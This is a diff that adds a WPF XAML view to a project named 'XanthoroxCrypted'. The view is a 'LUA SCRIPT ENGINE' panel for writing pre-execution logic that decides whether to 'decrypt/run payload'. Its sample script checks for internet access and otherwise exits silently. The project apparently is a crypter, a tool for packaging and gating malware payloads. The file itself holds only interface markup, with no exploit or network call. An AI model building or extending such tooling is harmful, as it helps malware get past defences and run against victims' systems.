@@ -1,0 +1,45 @@
+<UserControl x:Class="XanthoroxCrypted.Views.ScriptingView"
+             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
+             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
+             mc:Ignorable="d" 
+             d:DesignHeight="450" d:DesignWidth="800">
+    <Grid Margin="20">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="Auto"/>
+        </Grid.RowDefinitions>
+
+        <StackPanel Grid.Row="0">
+            <TextBlock Text="LUA SCRIPT ENGINE" Foreground="{StaticResource Brush_NeonCyan}" FontSize="18" FontWeight="Bold" Margin="0,0,0,5">
+                <TextBlock.Effect>
+                    <DropShadowEffect Color="{StaticResource Color_NeonCyan}" BlurRadius="10" ShadowDepth="0" Opacity="0.4"/>
+                </TextBlock.Effect>
+            </TextBlock>
+            <TextBlock Text="Write custom pre-execution logic. Return 'true' to decrypt/run payload, 'false' to abort." Foreground="{StaticResource Brush_TextMuted}" Margin="0,0,0,15"/>
+        </StackPanel>
+
+        <!-- Code Editor Placeholder -->
+        <Border Grid.Row="1" Background="#0B0E14" BorderBrush="#3300F3FF" BorderThickness="1">
+            <TextBox x:Name="TxtScript" 
+                     Background="Transparent" 
+                     Foreground="#A6ACCD" 
+                     FontFamily="Consolas, Courier New" 
+                     FontSize="14" 
+                     AcceptsReturn="True" 
+                     AcceptsTab="True"
+                     Padding="10"
+                     TextWrapping="NoWrap"
+                     VerticalScrollBarVisibility="Auto"
+                     HorizontalScrollBarVisibility="Auto"
+                     Text="-- Xanthorox Lua Engine v1.0&#10;function Main()&#10;    -- Example: Check if internet is available&#10;    if API.CheckInternet() then&#10;        API.MessageBox('Starting Payload...', 'Info')&#10;        return true -- Proceed to decryption&#10;    else&#10;        return false -- Silent exit&#10;    end&#10;end"/>
+        </Border>
+
+        <StackPanel Grid.Row="2" Orientation="Horizontal" HorizontalAlignment="Right" Margin="0,15,0,0">
+            <Button Content="Load Script" Style="{StaticResource Style_BtnNeon}" Margin="0,0,10,0" Click="BtnLoad_Click"/>
+            <Button Content="Save Script" Style="{StaticResource Style_BtnNeon}" Click="BtnSave_Click"/>
+        </StackPanel>
+    </Grid>
+</UserControl>
